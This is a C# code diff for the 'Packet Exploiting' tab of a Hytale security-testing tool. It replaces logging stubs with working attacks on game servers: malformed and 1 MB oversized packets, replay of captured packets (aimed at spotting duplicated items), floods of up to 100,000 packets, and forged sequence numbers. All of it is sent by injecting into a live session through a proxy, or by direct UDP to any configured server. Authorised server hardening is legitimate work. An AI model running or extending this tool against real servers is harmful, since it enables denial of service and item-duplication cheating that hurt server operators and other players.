@@ -2,261 +2,387 @@ using ImGuiNET;
 using HytaleSecurityTester.Core;
 using System.Numerics;
 using System.Text;
-using System;
+using System.Net.Sockets;
 
 namespace HytaleSecurityTester.Tabs;
 
-/// <summary>
-/// Packet-level security tests — malformed packets, replay attacks, flood tests, etc.
-/// </summary>
 public class PacketTab : ITab
 {
-    public string Title => "  Packets  ";
+    public string Title => "  Packet Exploiting  ";
 
-    private readonly TestLog _log;
+    private readonly TestLog       _log;
+    private readonly PacketCapture _capture;
+    private readonly UdpProxy      _udpProxy;
+    private readonly ServerConfig  _config;
 
-    // Malformed packet
-    private int    _packetId       = 0x00;
-    private string _payloadHex     = "DEADBEEF00FF";
-    private bool   _randomizeSize  = false;
-    private int    _payloadLen     = 64;
-
-    // Replay attack
+    // Shared paste field — used by both Replay and Sequence tests
     private string _capturedPacket = "";
-    private int    _replayCount    = 50;
-    private int    _replayDelayMs  = 10;
 
-    // Flood test
-    private int    _floodCount     = 500;
-    private int    _floodPacketId  = 0x10;
-    private bool   _floodRunning   = false;
+    // Malformed
+    private int    _packetId    = 0x00;
+    private string _payloadHex  = "DEADBEEF00FF";
+    private int    _payloadLen  = 64;
 
-    // Sequence manipulation
-    private bool   _outOfOrder     = false;
-    private bool   _duplicateSeq   = false;
-    private int    _seqOffset      = -1;
+    // Replay
+    private int  _replayCount   = 50;
+    private int  _replayDelayMs = 10;
 
-    public PacketTab(TestLog log) => _log = log;
+    // Flood
+    private int  _floodCount    = 500;
+    private int  _floodPacketId = 0x10;
+    private bool _floodRunning  = false;
+    private CancellationTokenSource? _floodCts;
+
+    // Sequence
+    private bool _outOfOrder   = false;
+    private bool _duplicateSeq = false;
+    private int  _seqOffset    = -1;
+
+    public PacketTab(TestLog log, PacketCapture capture, UdpProxy udpProxy, ServerConfig config)
+    {
+        _log      = log;
+        _capture  = capture;
+        _udpProxy = udpProxy;
+        _config   = config;
+    }
 
     public void Render()
     {
-        if (ImGui.BeginTabBar("##PacketSubTabs"))
-        {
-            if (ImGui.BeginTabItem("Malformed Packets"))
-            {
-                RenderMalformed();
-                ImGui.EndTabItem();
-            }
-            if (ImGui.BeginTabItem("Replay Attack"))
-            {
-                RenderReplay();
-                ImGui.EndTabItem();
-            }
-            if (ImGui.BeginTabItem("Flood / Rate Limit"))
-            {
-                RenderFlood();
-                ImGui.EndTabItem();
-            }
-            if (ImGui.BeginTabItem("Sequence Manipulation"))
-            {
-                RenderSequence();
-                ImGui.EndTabItem();
-            }
-            ImGui.EndTabBar();
-        }
+        float w    = ImGui.GetContentRegionAvail().X;
+        float half = (w - 12) * 0.5f;
+
+        RenderStatusBar(w);
+        ImGui.Spacing(); ImGui.Spacing();
+
+        UiHelper.SectionBox("MALFORMED PACKETS", half, 210, RenderMalformed);
+        ImGui.SameLine(0, 12);
+        UiHelper.SectionBox("REPLAY ATTACK",     half, 210, RenderReplay);
+
+        ImGui.Spacing(); ImGui.Spacing();
+
+        UiHelper.SectionBox("FLOOD / RATE LIMIT",     half, 160, RenderFlood);
+        ImGui.SameLine(0, 12);
+        UiHelper.SectionBox("SEQUENCE MANIPULATION",  half, 160, RenderSequence);
+
+        ImGui.Spacing(); ImGui.Spacing();
+
+        UiHelper.SectionBox(
+            "CAPTURED PACKET HEX  ← paste here for Replay & Sequence tests",
+            w, 66, RenderPasteField);
     }
 
-    // ── Malformed packets ─────────────────────────────────────────────────
+    private void RenderStatusBar(float w)
+    {
+        bool srv = _config.IsSet;
+        bool ses = _capture.IsRunning && _capture.ActiveSessions > 0;
+
+        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg2);
+        ImGui.BeginChild("##pst", new Vector2(w, 30), ImGuiChildFlags.Border);
+        ImGui.PopStyleColor();
+        ImGui.SetCursorPos(new Vector2(12, 6));
+        ImGui.PushStyleColor(ImGuiCol.Text,
+            srv ? MenuRenderer.ColAccent : MenuRenderer.ColDanger);
+        ImGui.TextUnformatted(srv
+            ? $"● {_config.ServerIp}:{_config.ServerPort}"
+            : "● No server — set in Dashboard");
+        ImGui.PopStyleColor();
+        ImGui.SameLine(0, 24);
+        ImGui.PushStyleColor(ImGuiCol.Text,
+            ses ? MenuRenderer.ColAccent : MenuRenderer.ColTextMuted);
+        ImGui.TextUnformatted(ses
+            ? "● Proxy session active — injecting via proxy"
+            : "● No proxy session — will send direct UDP");
+        ImGui.PopStyleColor();
+        ImGui.EndChild();
+    }
+
     private void RenderMalformed()
     {
-        ImGui.Spacing();
-        ImGui.TextColored(new Vector4(0.3f, 0.9f, 0.5f, 1f), "Malformed Packet Sender");
-        ImGui.TextDisabled("Send crafted packets with invalid fields to probe server validation.");
-        ImGui.Separator();
+        UiHelper.MutedLabel("Craft packets with invalid fields to probe server validation.");
         ImGui.Spacing();
 
-        ImGui.SetNextItemWidth(120);
-        ImGui.InputInt("Packet ID (hex)##pid", ref _packetId);
+        ImGui.SetNextItemWidth(110);
+        ImGui.InputInt("Packet ID##pid", ref _packetId);
         _packetId = Math.Clamp(_packetId, 0, 0xFFFF);
-
-        ImGui.SetNextItemWidth(300);
-        ImGui.InputText("Payload (hex)##pay", ref _payloadHex, 512);
         ImGui.SameLine();
-        if (ImGui.Button("Random##randpay"))
-            _payloadHex = GenerateRandomHex(16);
+        UiHelper.AccentText($"0x{_packetId:X4}");
 
-        ImGui.Checkbox("Randomize payload size", ref _randomizeSize);
-        if (!_randomizeSize)
-        {
-            ImGui.SameLine();
-            ImGui.SetNextItemWidth(100);
-            ImGui.InputInt("Bytes##plen", ref _payloadLen);
-            _payloadLen = Math.Clamp(_payloadLen, 1, 65535);
-        }
+        ImGui.SetNextItemWidth(-60);
+        ImGui.InputText("Payload##pay", ref _payloadHex, 512);
+        ImGui.SameLine();
+        UiHelper.SecondaryButton("Rnd", 52, 22, () => _payloadHex = RandomHex(16));
 
+        ImGui.SetNextItemWidth(100);
+        ImGui.InputInt("Pad bytes##pl", ref _payloadLen);
+        _payloadLen = Math.Clamp(_payloadLen, 0, 65535);
         ImGui.Spacing();
 
-        ImGui.PushStyleColor(ImGuiCol.Button, new Vector4(0.5f, 0.2f, 0.0f, 1f));
-        if (ImGui.Button("Send Malformed Packet", new Vector2(220, 32)))
-            SimulateMalformedSend();
-        ImGui.PopStyleColor();
-
-        ImGui.SameLine();
-
-        if (ImGui.Button("Send Oversized Packet", new Vector2(200, 32)))
-            SimulateOversizedSend();
-
-        ImGui.Spacing();
-        ImGui.TextDisabled("Tests: invalid length header, wrong field types, oversized payloads.");
+        UiHelper.WarnButton("Send Malformed", 148, 28, SendMalformed);
+        ImGui.SameLine(0, 6);
+        UiHelper.WarnButton("Oversized 1MB",  130, 28, SendOversized);
+        ImGui.SameLine(0, 6);
+        UiHelper.WarnButton("Empty", 80, 28,
+            () => SendRaw(new byte[] { (byte)_packetId }, "empty"));
     }
 
-    private void SimulateMalformedSend()
-    {
-        string hex = string.IsNullOrWhiteSpace(_payloadHex) ? "00" : _payloadHex;
-        _log.Info($"[Malformed] Sending packet ID=0x{_packetId:X4} payload={hex}");
-        // TODO: replace with real socket send when connected
-        _log.Warn("[Malformed] Stub — replace with actual TCP/UDP send logic");
-        _log.Success("[Malformed] Test dispatched. Monitor server logs for errors.");
-    }
-
-    private void SimulateOversizedSend()
-    {
-        int size = 1024 * 1024; // 1 MB
-        _log.Info($"[Oversized] Sending {size / 1024} KB packet to test buffer handling");
-        _log.Warn("[Oversized] Stub — replace with actual socket send logic");
-    }
-
-    // ── Replay attack ─────────────────────────────────────────────────────
     private void RenderReplay()
     {
+        UiHelper.MutedLabel("Re-send a captured packet to test replay protection.");
         ImGui.Spacing();
-        ImGui.TextColored(new Vector4(0.3f, 0.9f, 0.5f, 1f), "Packet Replay Attack");
-        ImGui.TextDisabled("Re-send a captured packet multiple times to test replay protection.");
-        ImGui.Separator();
+        UiHelper.MutedLabel("Uses the hex pasted in the field at the bottom.");
         ImGui.Spacing();
 
-        ImGui.SetNextItemWidth(400);
-        ImGui.InputText("Captured Packet (hex)##cap", ref _capturedPacket, 2048);
-        ImGui.SameLine();
-        if (ImGui.Button("Paste Example##ex"))
-            _capturedPacket = "01 00 00 00 FF A0 3C 10 00 00 00 00 00 00 00 01";
-
-        ImGui.SetNextItemWidth(120);
-        ImGui.InputInt("Replay Count##rc", ref _replayCount);
+        ImGui.SetNextItemWidth(110);
+        ImGui.InputInt("Count##rc", ref _replayCount);
         _replayCount = Math.Clamp(_replayCount, 1, 10000);
-
-        ImGui.SetNextItemWidth(120);
-        ImGui.InputInt("Delay (ms)##rdel", ref _replayDelayMs);
+        ImGui.SameLine(0, 12);
+        ImGui.SetNextItemWidth(110);
+        ImGui.InputInt("Delay ms##rd", ref _replayDelayMs);
         _replayDelayMs = Math.Clamp(_replayDelayMs, 0, 5000);
-
         ImGui.Spacing();
 
-        ImGui.PushStyleColor(ImGuiCol.Button, new Vector4(0.5f, 0.2f, 0.0f, 1f));
-        if (ImGui.Button("Start Replay", new Vector2(160, 32)))
+        UiHelper.WarnButton("Start Replay", 148, 28, () =>
         {
             if (string.IsNullOrWhiteSpace(_capturedPacket))
-                _log.Error("[Replay] No packet data provided.");
-            else
-                SimulateReplay();
-        }
-        ImGui.PopStyleColor();
+                _log.Error("[Replay] Paste packet hex in the field at the bottom first.");
+            else StartReplay();
+        });
 
         ImGui.Spacing();
-        ImGui.TextDisabled("Check server for: item duplication, currency changes, position resets.");
+        UiHelper.MutedLabel("Watch: item duped or action repeats = no replay protection.");
     }
 
-    private void SimulateReplay()
-    {
-        _log.Info($"[Replay] Replaying packet {_replayCount}x with {_replayDelayMs}ms interval");
-        _log.Info($"[Replay] Data: {_capturedPacket[..Math.Min(40, _capturedPacket.Length)]}...");
-        _log.Warn("[Replay] Stub — connect real packet replay logic here");
-    }
-
-    // ── Flood test ────────────────────────────────────────────────────────
     private void RenderFlood()
     {
-        ImGui.Spacing();
-        ImGui.TextColored(new Vector4(0.3f, 0.9f, 0.5f, 1f), "Packet Flood / Rate Limit Test");
-        ImGui.TextDisabled("Rapidly send packets to test server rate limiting and DoS protection.");
-        ImGui.Separator();
+        UiHelper.MutedLabel("Rapidly flood the server to test rate limiting.");
         ImGui.Spacing();
 
-        ImGui.SetNextItemWidth(120);
+        ImGui.SetNextItemWidth(110);
         ImGui.InputInt("Packet ID##fid", ref _floodPacketId);
+        ImGui.SameLine();
+        UiHelper.AccentText($"0x{_floodPacketId:X2}");
 
-        ImGui.SetNextItemWidth(120);
-        ImGui.InputInt("Packet Count##fc", ref _floodCount);
+        ImGui.SetNextItemWidth(110);
+        ImGui.InputInt("Count##fc", ref _floodCount);
         _floodCount = Math.Clamp(_floodCount, 1, 100_000);
-
         ImGui.Spacing();
 
         if (_floodRunning)
         {
-            ImGui.PushStyleColor(ImGuiCol.Button, new Vector4(0.5f, 0.1f, 0.1f, 1f));
-            if (ImGui.Button("Stop Flood", new Vector2(140, 32)))
+            UiHelper.DangerButton("Stop", 100, 28, () =>
             {
+                _floodCts?.Cancel();
                 _floodRunning = false;
-                _log.Warn("[Flood] Test stopped by user.");
-            }
-            ImGui.PopStyleColor();
-            ImGui.SameLine();
-            ImGui.TextColored(new Vector4(0.9f, 0.5f, 0.1f, 1f), "Running...");
+                _log.Warn("[Flood] Stopped.");
+            });
+            ImGui.SameLine(0, 10);
+            UiHelper.WarnText("● Flooding...");
         }
         else
         {
-            ImGui.PushStyleColor(ImGuiCol.Button, new Vector4(0.5f, 0.2f, 0.0f, 1f));
-            if (ImGui.Button("Start Flood", new Vector2(140, 32)))
-            {
-                _floodRunning = true;
-                _log.Info($"[Flood] Sending {_floodCount} packets (ID=0x{_floodPacketId:X4})");
-                _log.Warn("[Flood] Stub — wire up actual async send logic here");
-                // Immediately stop stub after logging
-                _floodRunning = false;
-            }
-            ImGui.PopStyleColor();
+            UiHelper.WarnButton("Start Flood", 130, 28, StartFlood);
         }
-
-        ImGui.Spacing();
-        ImGui.TextDisabled("Expected behavior: server should throttle/kick after threshold.");
     }
 
-    // ── Sequence manipulation ─────────────────────────────────────────────
     private void RenderSequence()
     {
-        ImGui.Spacing();
-        ImGui.TextColored(new Vector4(0.3f, 0.9f, 0.5f, 1f), "Sequence Number Manipulation");
-        ImGui.TextDisabled("Test how the server handles out-of-order or duplicated sequence IDs.");
-        ImGui.Separator();
+        UiHelper.MutedLabel("Test out-of-order or duplicate sequence IDs.");
         ImGui.Spacing();
 
-        ImGui.Checkbox("Send out-of-order packets", ref _outOfOrder);
-        ImGui.Checkbox("Send duplicate sequence numbers", ref _duplicateSeq);
+        ImGui.Checkbox("Out-of-order##oo", ref _outOfOrder);
+        ImGui.SameLine(0, 16);
+        ImGui.Checkbox("Duplicate seq##ds", ref _duplicateSeq);
 
         ImGui.SetNextItemWidth(100);
-        ImGui.InputInt("Sequence offset##seqoff", ref _seqOffset);
-
+        ImGui.InputInt("Seq offset##so", ref _seqOffset);
         ImGui.Spacing();
 
-        ImGui.PushStyleColor(ImGuiCol.Button, new Vector4(0.5f, 0.2f, 0.0f, 1f));
-        if (ImGui.Button("Run Sequence Test", new Vector2(200, 32)))
+        UiHelper.WarnButton("Run Sequence Test", 170, 28, () =>
         {
-            _log.Info($"[SeqTest] OutOfOrder={_outOfOrder} Duplicate={_duplicateSeq} Offset={_seqOffset}");
-            _log.Warn("[SeqTest] Stub — connect actual sequence manipulation logic here");
-            _log.Success("[SeqTest] Test dispatched.");
-        }
-        ImGui.PopStyleColor();
+            if (string.IsNullOrWhiteSpace(_capturedPacket))
+            { _log.Error("[SeqTest] Paste packet hex at the bottom first."); return; }
+            try
+            {
+                string clean = _capturedPacket.Replace(" ", "");
+                if (clean.Length % 2 != 0) clean += "0";
+                byte[] bp = Convert.FromHexString(clean);
+                Task.Run(async () =>
+                {
+                    if (_outOfOrder)
+                    {
+                        for (int s = 3; s >= 1; s--)
+                        {
+                            var p = ModifySeq(bp, s + _seqOffset);
+                            if (!await TrySendAsync(p)) break;
+                            await Task.Delay(10);
+                        }
+                    }
 
-        ImGui.Spacing();
-        ImGui.TextDisabled("Watch for: items appearing twice, inventory desyncs, rollback failures.");
+                    if (_duplicateSeq)
+                    {
+                        for (int i = 0; i < 5; i++)
+                        {
+                            var p = ModifySeq(bp, _seqOffset);
+                            if (!await TrySendAsync(p)) break;
+                            await Task.Delay(10);
+                        }
+                    }
+
+                    _log.Success("[SeqTest] Done.");
+                });
+            }
+            catch (Exception ex) { _log.Error($"[SeqTest] {ex.Message}"); }
+        });
     }
 
-    // ── Helpers ───────────────────────────────────────────────────────────
-    private static string GenerateRandomHex(int bytes)
+    private void RenderPasteField()
     {
-        var rng = new Random();
-        var sb  = new StringBuilder();
-        for (int i = 0; i < bytes; i++)
-            sb.AppendFormat("{0:X2}", rng.Next(256));
+        UiHelper.MutedLabel("Capture tab → click packet → Copy Hex → Ctrl+V here");
+        ImGui.SetNextItemWidth(-1);
+        ImGui.InputText("##ch", ref _capturedPacket, 4096);
+    }
+
+    // ── Logic ─────────────────────────────────────────────────────────────
+
+    private void SendMalformed()
+    {
+        try
+        {
+            string clean = _payloadHex.Replace(" ", "");
+            if (clean.Length % 2 != 0) clean += "0";
+            byte[] payload;
+            try { payload = Convert.FromHexString(clean); }
+            catch { _log.Error("[Malformed] Invalid hex."); return; }
+
+            var pkt = new List<byte> { (byte)(_packetId & 0xFF) };
+            pkt.AddRange(payload);
+            if (_payloadLen > 0)
+            {
+                var pad = new byte[_payloadLen];
+                new Random().NextBytes(pad);
+                pkt.AddRange(pad);
+            }
+            SendRaw(pkt.ToArray(), "malformed");
+        }
+        catch (Exception ex) { _log.Error($"[Malformed] {ex.Message}"); }
+    }
+
+    private void SendOversized()
+    {
+        var data = new byte[1024 * 1024];
+        new Random().NextBytes(data);
+        data[0] = (byte)(_packetId & 0xFF);
+        SendRaw(data, "oversized");
+    }
+
+    private void StartReplay()
+    {
+        try
+        {
+            string clean = _capturedPacket.Replace(" ", "").Replace("\n", "");
+            if (clean.Length % 2 != 0) clean += "0";
+            byte[] data  = Convert.FromHexString(clean);
+            int    count = _replayCount;
+            int    delay = _replayDelayMs;
+
+            _log.Info($"[Replay] {count}x delay={delay}ms");
+
+            Task.Run(async () =>
+            {
+                int sent = 0;
+                for (int i = 0; i < count; i++)
+                {
+                    bool ok = await TrySendAsync(data);
+                    if (!ok)
+                        try { DirectSend(data); ok = true; }
+                        catch (Exception ex) { _log.Error($"[Replay] {ex.Message}"); break; }
+                    sent++;
+                    if (delay > 0) await Task.Delay(delay);
+                }
+                _log.Success($"[Replay] {sent}/{count} sent.");
+            });
+        }
+        catch (Exception ex) { _log.Error($"[Replay] {ex.Message}"); }
+    }
+
+    private void StartFlood()
+    {
+        _floodRunning = true;
+        _floodCts     = new CancellationTokenSource();
+        int count = _floodCount, pid = _floodPacketId;
+        var cts   = _floodCts;
+
+        _log.Info($"[Flood] {count}x ID=0x{pid:X2}");
+
+        Task.Run(async () =>
+        {
+            var rng = new Random(); int sent = 0;
+            try
+            {
+                for (int i = 0; i < count; i++)
+                {
+                    if (cts.IsCancellationRequested) break;
+                    var data = new byte[rng.Next(4, 64)];
+                    rng.NextBytes(data); data[0] = (byte)(pid & 0xFF);
+                    if (!await TrySendAsync(data)) break;
+                    sent++;
+                    if (sent % 100 == 0) _log.Info($"[Flood] {sent}/{count}");
+                }
+            }
+            catch (Exception ex) { _log.Error($"[Flood] {ex.Message}"); }
+            finally { _floodRunning = false; _log.Success($"[Flood] {sent}/{count}."); }
+        });
+    }
+
+    private void SendRaw(byte[] data, string lbl)
+    {
+        // Prefer UDP proxy injection (injects into the real game session)
+        if (_udpProxy.IsRunning && _udpProxy.InjectToServer(data))
+        {
+            _log.Success($"[{lbl}] {data.Length}b injected via UDP proxy.");
+            return;
+        }
+        // Fall back to legacy TCP session injection
+        bool tcpOk = _capture.InjectToServer(data).GetAwaiter().GetResult();
+        if (tcpOk) { _log.Success($"[{lbl}] {data.Length}b injected via TCP."); return; }
+
+        // Last resort: direct UDP (no active session)
+        _log.Warn($"[{lbl}] No active session — sending direct UDP to " +
+                  $"{_config.ServerIp}:{_config.ServerPort}");
+        try { DirectSend(data); _log.Success($"[{lbl}] {data.Length}b sent."); }
+        catch (Exception ex) { _log.Error($"[{lbl}] {ex.Message}"); }
+    }
+
+    private async Task<bool> TrySendAsync(byte[] data)
+    {
+        if (_udpProxy.IsRunning && _udpProxy.InjectToServer(data)) return true;
+        if (await _capture.InjectToServer(data)) return true;
+        try { DirectSend(data); return true; }
+        catch { return false; }
+    }
+
+    private void DirectSend(byte[] data)
+    {
+        using var udp = new UdpClient();
+        udp.Connect(_config.ServerIp, _config.ServerPort);
+        udp.Send(data, data.Length);
+    }
+
+    private static byte[] ModifySeq(byte[] src, int seq)
+    {
+        var c = (byte[])src.Clone();
+        if (c.Length >= 5)
+        {
+            var b = BitConverter.GetBytes(seq);
+            c[1] = b[0]; c[2] = b[1]; c[3] = b[2]; c[4] = b[3];
+        }
+        return c;
+    }
+
+    private static string RandomHex(int n)
+    {
+        var rng = new Random(); var sb = new StringBuilder();
+        for (int i = 0; i < n; i++) sb.AppendFormat("{0:X2}", rng.Next(256));
         return sb.ToString();
     }
 }
